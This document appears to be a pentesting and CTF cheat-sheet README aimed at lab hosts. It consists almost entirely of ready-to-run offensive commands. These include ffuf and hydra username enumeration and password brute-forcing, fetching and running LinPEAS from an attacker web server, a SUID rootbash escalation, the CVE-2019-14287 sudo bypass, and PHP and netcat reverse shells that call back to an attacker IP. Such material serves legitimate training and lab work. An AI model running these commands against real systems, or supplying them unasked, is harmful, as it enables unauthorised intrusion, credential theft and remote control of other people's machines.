
# 🛡️ Pentesting & CTF Toolkit

This repo contains a collection of useful commands, tools, and techniques used in Capture the Flag (CTF) challenges and real-world penetration testing scenarios.

---

## 🔍 Directory & File Enumeration

### Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-u https://bricks.thm/ -x php,html,xml,txt -k -t 20
```

---

## 👤 Username Enumeration

### FFUF for Username Enumeration
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
-X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.10.206.92/customers/signup -mr "username already exists"
```

#### 🧠 Key Arguments
- `-w` – Wordlist for usernames
- `-X POST` – Set HTTP method to POST
- `-d` – POST data payload
- `-H` – Custom headers
- `-mr` – Match string for valid enumeration

---

## 🔐 Brute Force Login

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
-X POST -d "username=W1&password=W2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.10.206.92/customers/login -fc 200
```

### 💡 Tips
- Use `-fc 200` to filter failed login responses
- Match successful attempts when status code ≠ 200

---

## 🕵️‍♂️ Subdomain & Web Content Discovery

### DNS Subdomain Discovery
```bash
ffuf -u http://lookup.thm -H "HOST:FUZZ.lookup.thm" \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1
```

### Web Content Discovery
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web_Content/big.txt \
-u http://lookup.thm/FUZZ -e .php
```

---

## 💣 Password Cracking

### Hydra Examples
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agentsudo.thm -t 4

hydra -l miles -P ~/log1.txt skynet.thm http-post-form \
"/squirrelmail/src/login.php:username=^USER^&password=^PASS^:Wrong" -f
```

---

## 🐚 Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Background the shell
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
```

---

## 🧑‍💻 Privilege Escalation

### SUID Binaries
```bash
find / -perm /4000 2>/dev/null
```

### LinPEAS (Local Privilege Escalation Tool)
```bash
# On attack machine
python3.12 -m http.server

# On target
cd /tmp && wget http://<tun0-ip>:8000/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

### Rootbash Escalation
```bash
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
/tmp/rootbash -p
```

---

## 🧰 Linux Enumeration

```bash
systemctl list-units | grep running
ps aux
sudo -l
ls -al /home/think
ls -la
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
```

---

## 🔧 Network Scanning

### Nmap
```bash
nmap -A -F <IP>
nmap -sV -sC --script vuln -oN scan.nmap <IP>
```

### RustScan
```bash
rustscan -a <target> -- -A
```

### Netcat
```bash
nc [ip] [port]
```

---

## 📡 SMB & Samba

```bash
smbclient '\\<ip>\anonymous'
smbclient -U milesdyson '\\skynet.thm\milesdyson'
enum4linux -a <ip>
```

---

## 🧨 Reverse Shells

### PHP Reverse Shell
```bash
nc -lvnp 7777
/usr/bin/php -r '$sock=fsockopen("10.8.27.206",7777);exec("sh <&3 >&3 2>&3");'
```

### Netcat Reverse Shell
```bash
nc -nvlp 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.27.206 1234 >/tmp/f
```

---

## 🔍 CVE Exploits

### CVE-2019-14287 – Sudo Bypass
```bash
sudo -u#-1 bash
```

---

## 📦 File & Data Handling

### SCP – Secure Copy
```bash
scp <user>@<ip>:/remote/path /local/path
```

### Base64 Decoding
```bash
echo "SGVsbG8=" | base64 -d
```

### Binwalk for Hidden Data
```bash
binwalk -e <filename>.png
```

### Zip Cracking
```bash
zip2john file.zip > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Steghide
```bash
steghide extract -sf file.jpg
```

---

## ⚙️ Automation & Updates

### Schedule Linux Updates via Crontab
```bash
crontab -e
# Add this line for weekly updates at 2 AM Sunday
0 2 * * 0 /usr/bin/python3 /path/to/update_system.py
```

---

## 🧠 Useful Tools

- 🔧 [LinPEAS](https://github.com/peass-ng/PEASS-ng/releases) – Privilege escalation auditing
- 🔍 [WhatWeb](https://github.com/urbanadventurer/WhatWeb) – Website fingerprinting
- 🐚 [FFUF](https://github.com/ffuf/ffuf) – Web fuzzing
- 🕳️ [Gobuster](https://github.com/OJ/gobuster) – Directory & DNS busting

---

**Happy Hacking!** 💻🔥  
Stay ethical, stay sharp.
